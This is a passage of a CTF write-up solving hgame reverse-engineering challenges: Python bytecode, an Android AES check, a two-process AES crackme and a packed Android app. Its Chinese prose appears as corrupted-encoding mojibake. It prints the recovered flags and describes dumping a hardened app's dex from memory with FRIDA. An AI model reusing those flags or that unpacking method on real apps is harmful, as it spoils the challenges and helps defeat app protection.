class="number">140</span> LOAD_GLOBAL              <span class="number">6</span> (bytes)</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">144</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">146</span> LOAD_METHOD              <span class="number">7</span> (hex)</span><br><span class="line">            <span class="number">148</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">            <span class="number">150</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = bytes(res).hex()</span></span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>         <span class="number">152</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="keyword">print</span>)</span><br><span class="line">            <span class="number">154</span> LOAD_CONST               <span class="number">6</span> (<span class="string">'your flag: '</span>)</span><br><span class="line">            <span class="number">156</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">158</span> BINARY_ADD</span><br><span class="line">            <span class="number">160</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#print('your flag: ' + res)</span></span><br><span class="line">            <span class="number">162</span> POP_TOP</span><br><span class="line">            <span class="number">164</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">166</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure><p>æœ€åç®€å•é€†ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span></span><br><span class="line">enc = bytes.fromhex(enc)</span><br><span class="line">flag = [b^i <span class="keyword">for</span> b, i <span class="keyword">in</span> enumerate(enc)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)//<span class="number">2</span>):</span><br><span class="line">    flag[<span class="number">2</span>*i], flag[<span class="number">2</span>*i+<span class="number">1</span>] = flag[<span class="number">2</span>*i+<span class="number">1</span>], flag[<span class="number">2</span>*i]</span><br><span class="line">print(<span class="string">''</span>.join(map(chr, flag)))</span><br><span class="line"><span class="comment">#G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~</span></span><br></pre></td></tr></table></figure><h3 id="ezApk"><a href="#ezApk" class="headerlink" title="ezApk"></a>ezApk</h3><p>ç®€å•çš„å®‰å“ï¼Œåªæœ‰javaä»£ç ï¼Œæ‰¾åˆ°æŒ‰é’®æ´»åŠ¨ã€‚</p><p><img src="https://i.loli.net/2021/02/27/56TDYkbSyOjLNpK.png" alt="image-20210215155612517"></p><p>å°±æ˜¯å–å‡ºæ–‡æœ¬å†…å®¹ï¼Œç„¶åæŠŠè¾“å…¥å’Œå¯†æ–‡ä¼ å…¥sæ–¹æ³•ï¼ŒéªŒè¯æ˜¯å¦æ­£ç¡®ã€‚</p><p>åˆ°sæ–¹æ³•ï¼šä¸€ä¸ªcbcæ¨¡å¼çš„aesåŠ å¯†ï¼Œå¡«å……æ–¹å¼ä¸ºPKCS7Paddingã€‚</p><p><img src="https://i.loli.net/2021/02/27/hcqCNUm63VFPaZR.png" alt="image-20210215155952276"></p><p>æ‰€ä»¥è§£å¯†å¯†æ–‡å°±åº”è¯¥æ˜¯flagäº†ï¼Œä½¿ç”¨javaç”¨åŒæ ·çš„æ–¹å¼è°ƒç”¨ä¸€ä¸‹è§£å¯†æ–¹æ³•ã€‚è¿™é‡Œæ³¨æ„ä¸€ç‚¹å°±æ˜¯ï¼šjavaä¸­è‡ªå¸¦çš„æ˜¯PKCS5Paddingå¡«å……ï¼Œç›´æ¥ä½¿ç”¨PKCS7Paddingä¼šæŠ¥é”™ï¼Œä½†æœç´¢åˆ°è¿™2ä¸ªä½¿ç”¨èµ·æ¥æ˜¯ä¸€æ ·çš„ï¼Œå°±ç›´æ¥æ”¹æˆPKCS5Paddingå°±å¥½äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ctf;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cry</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hash(String a, String b) <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException&#123;</span><br><span class="line">MessageDigest v2 = MessageDigest.getInstance(a);</span><br><span class="line"><span class="keyword">byte</span>[] v3 = b.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="keyword">byte</span>[] ans = v2.digest(v3);</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">aes_test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException</span>&#123;</span><br><span class="line"></span><br><span class="line">String key = <span class="string">"A_HIDDEN_KEY"</span>;</span><br><span class="line">String input = <span class="string">"EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY"</span>;</span><br><span class="line">Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line"><span class="keyword">byte</span>[] enc = decoder.decode(input);</span><br><span class="line">SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(cry.hash(<span class="string">"SHA-256"</span>, key), <span class="string">"AES"</span>);</span><br><span class="line">IvParameterSpec v2 = <span class="keyword">new</span> IvParameterSpec(cry.hash(<span class="string">"MD5"</span>, key));</span><br><span class="line">Cipher v5 = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</span><br><span class="line">v5.init(<span class="number">2</span>, v1, v2);</span><br><span class="line">System.out.println(<span class="string">"key: "</span> + byte_hex.bytes2hex(v1.getEncoded()));</span><br><span class="line">System.out.println(<span class="string">"iv: "</span> + byte_hex.bytes2hex(v2.getIV()));</span><br><span class="line"><span class="keyword">byte</span>[] plain = v5.doFinal(enc);</span><br><span class="line">System.out.println(<span class="keyword">new</span> String(plain));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">key: fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6</span></span><br><span class="line"><span class="comment">iv: 99c6bd34c31b78b4c4b964a7745e6300</span></span><br><span class="line"><span class="comment">hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿä¸ç”¨è¿™ä¹ˆéº»çƒ¦çš„ï¼Œå…³é”®æ˜¯æƒ³ç»ƒä¹ ä¸€ä¸‹javaã€‚</p><p>è‡ªå·±ç®—ä¸€ä¸‹hashå¾—åˆ°çš„keyå’Œivç”¨pythonæˆ–è€…åœ¨çº¿ç½‘ç«™è§£å¯†ä¸€ä¸‹ï¼Œæ–¹ä¾¿çš„å¤šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6'</span></span><br><span class="line">    key = bytes.fromhex(key)                            </span><br><span class="line">    </span><br><span class="line">    iv = <span class="string">'99c6bd34c31b78b4c4b964a7745e6300'</span></span><br><span class="line">    iv = bytes.fromhex(iv)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">        <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY'</span></span><br><span class="line">flag = AesEncry().decrypt(enc)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>é¦–å…ˆè¾“å…¥pass1çš„é€»è¾‘ï¼Œè½¬åŒ–ä¸€ä¸ª128ä½çš„å¤§æ•°ä¸æŒ‡å®šå¤§æ•°æ¯”è¾ƒï¼Œç„¶åä»¥æŒ‚èµ·åˆ›å»ºè‡ªèº«è¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œè°ƒç”¨CreateFileMappingA()å‡½æ•°æŠŠæ–‡ä»¶æ˜ åƒåˆ°å†…å­˜ï¼Œå†ä½¿ç”¨MapViewOfFile()å‡½æ•°æŠŠæ–‡ä»¶è§†æ˜ åƒåˆ°è¿›ç¨‹åœ°å€ç©ºé—´ä¸Šï¼ˆç”¨äºæŠŠå½“å‰è¿›ç¨‹çš„å†…å­˜ç©ºé—´çš„æ•°æ®ä¸å­è¿›ç¨‹å…±äº«ï¼‰ï¼Œç„¶ååœ¨éè°ƒè¯•çŠ¶æ€ä¸‹å¯¹è¦å…±äº«çš„æ•°æ®ç®€å•çš„å¼‚æˆ–åŠ å¯†ä¸€ä¸‹ï¼Œæœ€åæ¢å¤å¯åŠ¨åˆšåˆšåˆ›å»ºçš„å­è¿›ç¨‹ï¼Œè‡ªèº«è¿›ç¨‹ç¡çœ æŒ‚èµ·ï¼š</p><p><img src="https://i.loli.net/2021/02/27/kRrY7a6meKp59Pz.png" alt="image-20210215190636690"></p><p>å­è¿›ç¨‹å¯åŠ¨åï¼Œè°ƒç”¨OpenFileMappingA()ä¸MapViewOfFile()æŸ¥çœ‹çˆ¶è¿›ç¨‹å…±äº«çš„å†…å­˜æ•°æ®ï¼Œè‹¥å­˜åœ¨åˆ™è°ƒç”¨è¾“å…¥pass2çš„é€»è¾‘ï¼Œç„¶åä¸€ä¸ªcbcæ¨¡å¼çš„aesåŠ å¯†ã€‚</p><p><img src="https://i.loli.net/2021/02/27/Gna2KV58FQRH7oc.png" alt="image-20210215191030835"></p><p>ä½¿ç”¨pythonè§£å¯†ä¸€ä¸‹å¾—åˆ°pass2ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'2b0c5e6a3a20b189'</span></span><br><span class="line">key = [key[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line">key = bytes(key)</span><br><span class="line"><span class="comment">#key = bytes.fromhex(key)                            </span></span><br><span class="line"></span><br><span class="line">iv = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]</span><br><span class="line">iv = bytes(iv)</span><br><span class="line"><span class="comment">#iv = bytes.fromhex(iv)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">    cryptos = AES.new(self.key, mode)</span><br><span class="line">    cipher_text = cryptos.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    cryptos = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrpytBytes = base64.b64decode(data)</span><br><span class="line">    plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">    <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'t/7+2Qd2eWU/Tl9i1QL2fg=='</span></span><br><span class="line">flag = decrypt(enc)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7a4ad6c5671fb313</span></span><br></pre></td></tr></table></figure><p>æœ€åï¼š<strong>hgame{2b0c5e6a3a20b189_7a4ad6c5671fb313}</strong></p><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><p>ncè¿ä¸Šåï¼Œç©ºæ ¼åŠ å›è½¦è¿›è¡Œå•æ­¥è°ƒè¯•ã€‚</p><p>å®¹æ˜“å‘ç°ï¼Œæ˜¯å¯¹è¾“å…¥ä¸€ä½ä¸€ä½çš„å¼‚æˆ–åŠ å¯†åä¸æŒ‡å®šå€¼æ¯”è¾ƒï¼Œä¸å¯¹åˆ™é€€å‡ºã€‚</p><p><img src="https://i.loli.net/2021/02/27/SMEapnGisTgZIWl.png" alt="image-20210216180859920"></p><p>å¼€å§‹çš„æ ¼å¼æ˜¯çŸ¥é“çš„ï¼Œæ‰€ä»¥åé¢ä¸€ä½ä¸€ä½æ…¢æ…¢çš„è·Ÿä¸€ä¸‹å°±å¥½äº†ã€‚</p><p><strong>hgame{You_Kn0w_debuGg3r}</strong></p><h3 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h3><p>jadxåç¼–è¯‘åæ²¡æœ‰å‘ç°MainActivityï¼Œä½†ä»å‡ ä¸ªç‰¹å¾å¯ä»¥çŸ¥é“appè¿›è¡Œæ¢†æ¢†åŠ å›ºå…è´¹ç‰ˆè¿›è¡ŒåŠ å›ºã€‚</p><p><img src="https://i.loli.net/2021/02/27/3xWMP72bsnJ89qe.png" alt="image-20210227105625088"></p><p>æˆ‘ä»¬çš„ç›®çš„ä¸»è¦æ˜¯å¾—åˆ°è§£å¯†åçš„å…³é”®dexåˆ†æMainActivityï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è€ƒè™‘ç”¨frida-dumpdexæ¥dumpå‡ºå†…å­˜ä¸­çš„dexã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">https://github.com/hluwa/FRIDA-DEXDump</a></p><p>æ­å»ºfridaç¯å¢ƒæ—¶æ³¨æ„ä¸€ç‚¹ï¼šå®‰è£…çš„fridaçš„ç‰ˆæœ¬è¦å’ŒæœåŠ¡ç«¯å®‰è£…çš„frida-serverç‰ˆæœ¬è¦ä¸€è‡´ã€‚</p><p>dumpå‡ºdexåä»åˆ°å°çš„æ‹–è¿›jebä¸­åç¼–è¯‘ï¼Œ0xbf03a000.dexæ˜¯æˆ‘ä»¬è¦æ‰¾çš„ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ›å»ºäº†å¤šä¸ªçº¿ç¨‹è¿›è¡Œæ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/02/27/r6JaDQfPuLT7qCH.png" alt="image-20210227111613020"></p><p>çœ‹ä¸€ä¸‹åŠŸèƒ½ï¼š</p><p><img src="https://i.loli.net/2021/02/27/johwg4l5qzErmNb.png" alt="image-20210227111754345"></p><p>ç»§ç»­çœ‹fd.iæ–¹æ³•ï¼š</p><p><img src="https://i.loli.net/2021/02/27/ZiAxb93RSNz7Foa.png" alt="image-20210227112014590"></p><p>åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå°±å¯ä»¥çŸ¥é“ï¼Œæ˜¯å¼€å¯å¤šä¸ªçº¿ç¨‹è¿›è¡Œå‘é€æ•°æ®ï¼Œç„¶åæ¯ä¸ªçº¿ç¨‹æœ‰ä¸åŒçš„ç¡çœ æ—¶é—´ï¼Œè¿™å°±æœ‰äº†å…ˆåé¡ºåºã€‚</p><p>æˆ‘æ˜¯ç›´æ¥æŠŠæ‰€æœ‰æ•°æ®æŒ‰æ—¶é—´å»ºç«‹å…³ç³»åï¼Œæ‰“å°å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">0xfffffff</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">a[<span class="number">19530</span>] = <span class="string">'q'</span>, a[<span class="number">0x75F4</span>] = <span class="string">'e'</span>, a[<span class="number">0xA161</span>] = <span class="string">'d'</span>, a[<span class="number">7337</span>] = <span class="string">'f'</span>;</span><br><span class="line">a[<span class="number">0x5B0D</span>] = <span class="string">'e'</span>, a[<span class="number">0xC266</span>] = <span class="string">'x'</span>, a[<span class="number">0x887F</span>] = <span class="string">'q'</span>, a[<span class="number">50475</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span class="number">0xC05D</span>] = <span class="string">'a'</span>, a[<span class="number">0x909B</span>] = <span class="string">'u'</span>, a[<span class="number">8488</span>] = <span class="string">'a'</span>, a[<span class="number">0xC1CF</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">78545</span>] = <span class="string">'0'</span>, a[<span class="number">0x4B4C</span>] = <span class="string">'t'</span>, a[<span class="number">0xC807</span>] = <span class="string">'q'</span>, a[<span class="number">0x8C9B</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xB2B3</span>] = <span class="string">'k'</span>, a[<span class="number">2390</span>] = <span class="string">'z'</span>, a[<span class="number">0x568B</span>] = <span class="string">' '</span>, a[<span class="number">70963</span>] = <span class="string">'y'</span>;</span><br><span class="line">a[<span class="number">0xAF2B</span>] = <span class="string">' '</span>, a[<span class="number">0x397B</span>] = <span class="string">'d'</span>, a[<span class="number">10110</span>] = <span class="string">' '</span>, a[<span class="number">0xFE0D</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">0x33DE</span>] = <span class="string">'q'</span>, a[<span class="number">0xE105</span>] = <span class="string">' '</span>, a[<span class="number">40315</span>] = <span class="string">'b'</span>, a[<span class="number">79438</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x54C2</span>] = <span class="string">'e'</span>, a[<span class="number">0xD115</span>] = <span class="string">'y'</span>, a[<span class="number">0x84B9</span>] = <span class="string">'x'</span>, a[<span class="number">0xE4B4</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">28084</span>] = <span class="string">'f'</span>, a[<span class="number">83607</span>] = <span class="string">'&#125;'</span>, a[<span class="number">0x312F</span>] = <span class="string">'e'</span>, a[<span class="number">0x142F0</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">50828</span>] = <span class="string">'z'</span>, a[<span class="number">79540</span>] = <span class="string">'_'</span>, a[<span class="number">60636</span>] = <span class="string">'m'</span>, a[<span class="number">20891</span>] = <span class="string">'b'</span>;</span><br><span class="line">a[<span class="number">0x41D8</span>] = <span class="string">'a'</span>, a[<span class="number">0x18FC</span>] = <span class="string">'m'</span>, a[<span class="number">0xE91A</span>] = <span class="string">'r'</span>, a[<span class="number">0x13F0F</span>] = <span class="string">'I'</span>;</span><br><span class="line">a[<span class="number">0x70B8</span>] = <span class="string">'t'</span>, a[<span class="number">4741</span>] = <span class="string">'m'</span>, a[<span class="number">30778</span>] = <span class="string">' '</span>, a[<span class="number">0xEFA</span>] = <span class="string">'g'</span>;</span><br><span class="line">a[<span class="number">11980</span>] = <span class="string">'q'</span>, a[<span class="number">5130</span>] = <span class="string">'p'</span>, a[<span class="number">0x7F0</span>] = <span class="string">'a'</span>, a[<span class="number">0x13FA7</span>] = <span class="string">'0'</span>;</span><br><span class="line">a[<span class="number">0x4127</span>] = <span class="string">' '</span>, a[<span class="number">0x10D66</span>] = <span class="string">'Q'</span>, a[<span class="number">0x54A</span>] = <span class="string">'O'</span>, a[<span class="number">0xDBA0</span>] = <span class="string">'s'</span>;</span><br><span class="line">a[<span class="number">0x10EE1</span>] = <span class="string">'h'</span>, a[<span class="number">70302</span>] = <span class="string">'x'</span>, a[<span class="number">0x11C08</span>] = <span class="string">'n'</span>, a[<span class="number">0x4831</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0xE33C</span>] = <span class="string">'t'</span>, a[<span class="number">0xFAF4</span>] = <span class="string">' '</span>, a[<span class="number">80538</span>] = <span class="string">'i'</span>, a[<span class="number">0xF4E1</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span class="number">22890</span>] = <span class="string">'u'</span>, a[<span class="number">0x803B</span>] = <span class="string">'m'</span>, a[<span class="number">0x655B</span>] = <span class="string">'d'</span>, a[<span class="number">0xDC3A</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x3599</span>] = <span class="string">'o'</span>, a[<span class="number">44072</span>] = <span class="string">'k'</span>, a[<span class="number">0xB205</span>] = <span class="string">'N'</span>, a[<span class="number">0xBB43</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">80939</span>] = <span class="string">'7'</span>, a[<span class="number">0x3F07</span>] = <span class="string">'f'</span>, a[<span class="number">52068</span>] = <span class="string">'o'</span>, a[<span class="number">0xCAA2</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">72519</span>] = <span class="string">'_'</span>, a[<span class="number">0x11F52</span>] = <span class="string">'k'</span>, a[<span class="number">0x3CA5</span>] = <span class="string">'q'</span>, a[<span class="number">75894</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">0xF723</span>] = <span class="string">'e'</span>, a[<span class="number">0x7221</span>] = <span class="string">'u'</span>, a[<span class="number">0x2FCD</span>] = <span class="string">' '</span>, a[<span class="number">3501</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x9168</span>] = <span class="string">'e'</span>, a[<span class="number">0x8DC6</span>] = <span class="string">' '</span>, a[<span class="number">0x100CF</span>] = <span class="string">'s'</span>, a[<span class="number">0xCD51</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">0x10B56</span>] = <span class="string">'d'</span>, a[<span class="number">0x6ABD</span>] = <span class="string">' '</span>, a[<span class="number">0x103F7</span>] = <span class="string">'y'</span>, a[<span class="number">60485</span>] = <span class="string">'x'</span>;</span><br><span class="line">a[<span class="number">0x9589</span>] = <span class="string">'u'</span>, a[<span class="number">0x1105E</span>] = <span class="string">'3'</span>, a[<span class="number">54002</span>] = <span class="string">'b'</span>, a[<span class="number">0x12C3F</span>] = <span class="string">'1'</span>;</span><br><span class="line">a[<span class="number">0x6750</span>] = <span class="string">','</span>, a[<span class="number">0xBFCB</span>] = <span class="string">' '</span>, a[<span class="number">70562</span>] = <span class="string">'_'</span>, a[<span class="number">0xE66F</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">47203</span>] = <span class="string">'q'</span>, a[<span class="number">0x4994</span>] = <span class="string">'f'</span>, a[<span class="number">0xF098</span>] = <span class="string">'s'</span>, a[<span class="number">0xC131</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x16FB</span>] = <span class="string">'g'</span>, a[<span class="number">74919</span>] = <span class="string">'z'</span>, a[<span class="number">0xA96B</span>] = <span 